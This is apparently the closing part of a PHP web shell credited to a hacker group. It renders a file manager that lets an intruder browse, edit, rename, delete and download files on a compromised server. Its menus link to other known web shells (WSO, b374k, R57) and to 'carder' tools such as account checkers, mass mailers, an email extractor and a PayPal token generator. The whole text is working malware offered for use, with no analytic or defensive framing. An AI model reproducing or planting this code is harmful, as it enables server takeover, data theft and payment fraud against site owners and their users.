 				$href = "<a href='?dir=".dirname($dir)."'>$dirx</a>";
 			} elseif($dirx === '.') {
 				$href = "<a href='?dir=$dir'>$dirx</a>";
 			} else {
 				$href = "<a href='?dir=$dir/$dirx'>$dirx</a>";
 			}
 			if($dirx === '.' || $dirx === '..') {
 				$act_dir = "<a href='?act=newfile&dir=$dir'>newfile</a> | <a href='?act=newfolder&dir=$dir'>newfolder</a>";
 				} else {
 				$act_dir = "<a href='?act=rename_dir&dir=$dir/$dirx'>rename</a> | <a href='?act=delete_dir&dir=$dir/$dirx'>delete</a>";
 			
			}
			echo "<div id=content>";
 			echo "<tr>";
 			echo "<td class='td_home'><img src='data:image/png;base64,R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAA"."AAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp"."/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs='>$href</td>";
			echo "<td class='td_home'><center>$dtype</center></td>";
			echo "<td class='td_home'><center>-</center></th>";
			echo "<td class='td_home'><center>$dtime</center></td>";
			echo "<td class='td_home'><center>".w("$dir/$dirx",perms("$dir/$dirx"))."</center></td>";
			echo "<td class='td_home' style='padding-left: 15px;'>$act_dir</td>";
		}
		echo "</tr>";
		foreach($scandir as $file) {
			$ftype = filetype("$dir/$file");
			$ftime = date("F d Y g:i:s", filemtime("$dir/$file"));
			$size = filesize("$dir/$file")/1024;
			$size = round($size,3);
			if($size > 1024) {
				$size = round($size/1024,2). 'MB';
			} else {
				$size = $size. 'KB';
			}
			if(!is_file("$dir/$file")) continue;
			echo "<tr>";
			echo "<td class='td_home'><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9oJBhcTJv2B2d4AAAJMSURBVDjLbZO9ThxZEIW/qlvdtM38BNgJQmQgJGd+A/MQBLwGjiwH3nwdkSLtO2xERG5LqxXRSIR2YDfD4GkGM0P3rb4b9PAz0l7pSlWlW0fnnLolAIPB4PXh4eFunucAIILwdESeZyAifnp6+u9oNLo3gM3NzTdHR+//zvJMzSyJKKodiIg8AXaxeIz1bDZ7MxqNftgSURDWy7LUnZ0dYmxAFAVElI6AECygIsQQsizLBOABADOjKApqh7u7GoCUWiwYbetoUHrrPcwCqoF2KUeXLzEzBv0+uQmSHMEZ9F6SZcr6i4IsBOa/b7HQMaHtIAwgLdHalDA1ev0eQbSjrErQwJpqF4eAx/hoqD132mMkJri5uSOlFhEhpUQIiojwamODNsljfUWCqpLnOaaCSKJtnaBCsZYjAllmXI4vaeoaVX0cbSdhmUR3zAKvNjY6Vioo0tWzgEonKbW+KkGWt3Unt0CeGfJs9g+UU0rEGHH/Hw/MjH6/T+POdFoRNKChM22xmOPespjPGQ6HpNQ27t6sACDSNanyoljDLEdVaFOLe8ZkUjK5ukq3t79lPC7/ODk5Ga+Y6O5MqymNw3V1y3hyzfX0hqvJLybXFd++f2d3d0dms+qvg4ODz8fHx0/Lsbe3964sS7+4uEjunpqmSe6e3D3N5/N0WZbtly9f09nZ2Z/b29v2fLEevvK9qv7c2toKi8UiiQiqHbm6riW6a13fn+zv73+oqorhcLgKUFXVP+fn52+Lonj8ILJ0P8ZICCF9/PTpClhpBvgPeloL9U55NIAAAAAASUVORK5CYII='><a href='?act=view&dir=$dir&file=$dir/$file'>$file</a></td>";
			echo "<td class='td_home'><center>$ftype</center></td>";
			echo "<td class='td_home'><center>$size</center></td>";
			echo "<td class='td_home'><center>$ftime</center></td>";
			echo "<td class='td_home'><center>".w("$dir/$file",perms("$dir/$file"))."</center></td>";
			echo "<td class='td_home' style='padding-left: 15px;'><a href='?act=edit&dir=$dir&file=$dir/$file'>edit</a> | <a href='?act=rename&dir=$dir&file=$dir/$file'>rename</a> | <a href='?act=delete&dir=$dir&file=$dir/$file'>delete</a> | <a href='?act=download&dir=$dir&file=$dir/$file'>download</a></td>";
		}
		echo "</tr></div></table>";
	} else {
		echo "<font color=red>can't open directory</font>";
	}
	}
#########################################################################

echo "<center><hr><form>
<select onchange='if (this.value) window.open(this.value);'>
   <option selected='selected' value=''> Tools Creator </option>
   <option value='$ling=wso'>WSO 2.8.1</option>
   <option value='$ling=injection'>1n73ction v3</option>
   <option value='$ling=wk'>WHMCS Killer</option>
   <option value='$ling=adminer'>Adminer</option>
   <option value='$ling=b374k'>b374k Shell</option>
   <option value='$ling=b374k323'>b374k 3.2</option>   
   <option value='$ling=bh'>BlackHat Shell</option>      
   <option value='$ling=dhanus'>Dhanush Shell</option>     
   <option value='$ling=r57'>R57 Shell</option>    
<option value='$ling=encodedecode'>Encode Decode</option>    
<option value='$ling=r57'>R57 Shell</option>    
</select>
<select onchange='if (this.value) window.open(this.value);'>
   <option selected='selected' value=''> Tools Carder </option>
   <option value='$ling=extractor'>DB Email Extractor</option>
   <option value='$ling=promailerv2'>Pro Mailer V2</option>     
   <option value='$ling=bukalapak'>BukaLapak Checker</option>        
   <option value='$ling=tokopedia'>TokoPedia Checker</option>  
   <option value='$ling=tokenpp'>Paypal Token Generator</option>  
   <option value='$ling=mailer'>Mailer</option>  
   <option value='$ling=gamestopceker'>GamesTop Checker</option>
   </select>
<noscript><input type='submit' value='Submit'></noscript>
</form>Copyright &copy; ".date("Y")." - <a href='http://blog.garudasecurityhacker.org/' target='_blank'><font color=lime>Anazvr</font></a> </center><hr>";

?>
</html>
